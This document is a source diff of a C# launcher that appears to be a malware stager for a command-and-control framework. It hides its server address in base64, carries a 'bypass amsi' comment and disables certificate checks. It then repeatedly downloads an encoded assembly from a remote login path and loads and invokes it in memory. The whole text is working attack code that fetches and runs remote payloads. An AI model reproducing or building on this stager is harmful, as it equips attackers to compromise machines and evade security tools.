@@ -13,6 +13,8 @@ namespace Launcher
         public static void Main() {
             //bypass amsi
             string u = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             WebClient wc = new WebClient();
             wc.Headers.Add("User-Agent", u);
             wc.Proxy = WebRequest.DefaultWebProxy;
@@ -20,12 +22,24 @@ namespace Launcher
             string k = "[>f)3*<jQmh.asGZ(6xMJ1qOIvX&+#i:";
             string ser = Encoding.Unicode.GetString(Convert.FromBase64String("aAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADEAMAAwADgAMAA="));
             string t = "/login/process.php";
-            wc.Headers.Add("Cookie", "faVOgGsDheVq=+9GwXuAqlTf4O5cDNNSmAi9NFPk=");
-            byte[] data = wc.DownloadData(ser+t);
-            string decryptedAssembly = Encoding.ASCII.GetString(data);
-            Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
-            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ser,k });
+            string v = Environment.Version.Major.ToString();
+            if (v.Equals("2")){wc.Headers.Add("Cookie", "TpzxzECi=o4hBba3mD51VQ02eKDJEpTdhlTQ=");}
+            if (v.Equals("4")){wc.Headers.Add("Cookie", "TpzxzECi=d6M2FJAxhQakzvuGni4b4rGru1I=");}
+            while (true)
+            {
+                try
+                {
+                    byte[] data = wc.DownloadData(ser+t);
+                    string decryptedAssembly = Encoding.ASCII.GetString(data);
+                    Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
+                    agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ser,k,u });
+                    break;
+                }
+                catch(Exception ex){
+                    //ser=wc.DownloadString("").Trim();
+                }
 
+            }
         }
         private static byte[] Decompress(byte[] compressed)
         {
